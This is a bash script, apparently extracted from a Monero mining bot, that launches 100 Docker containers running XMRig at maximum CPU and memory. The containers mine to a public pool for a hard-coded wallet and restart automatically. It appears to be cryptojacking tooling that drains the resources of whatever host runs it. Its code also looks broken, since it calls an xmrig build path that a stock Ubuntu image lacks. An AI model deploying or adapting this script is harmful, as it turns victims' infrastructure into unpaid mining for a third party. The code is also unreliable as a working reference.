#!/bin/bash
# ==============================================================================
# deploy_100_nodes.sh - Deploy 100 XMRig Mining Node Containers
# Extracted from whoamisecxmrbot.txt
# ==============================================================================

set -e

NETWORK="miner-net"
IMAGE="ubuntu:22.04"
POOL_URL="pool.supportxmr.com:3333"
XMR_USER="8BuSHCofBXzAti2oQemtqo1j8q2UZHQBpFwqvJa6pMyUWp6x4QZTaWuHBmUxRb5S9Z6KZCqCaosZw78G9ufrffSz6AXjUhJ"
THREADS=64
CPU_MAX_THREADS=100

# Create network if it doesn't exist
echo "[*] Ensuring Docker network '$NETWORK' exists..."
docker network create "$NETWORK" 2>/dev/null || true

echo "[*] Deploying 100 mining nodes..."
for i in {1..100}; do
    docker run -d \
      --name "miner-node-$i" \
      --network "$NETWORK" \
      --cpus="64" \
      --memory="256g" \
      --restart always \
      "$IMAGE" \
      bash -c "
        cd /opt/xmrig/build
        ./xmrig --url=$POOL_URL \
                --user=$XMR_USER \
                --pass=node-$i \
                --threads=$THREADS \
                --cpu-max-threads-hint=$CPU_MAX_THREADS
      "
    echo "[+] Miner node $i started"
done

echo ""
echo "=== ALL 100 MINING NODES DEPLOYED ==="
echo "Network: $NETWORK"
echo "Pool:    $POOL_URL"
echo "Nodes:   miner-node-1 through miner-node-100"
echo "========================================="
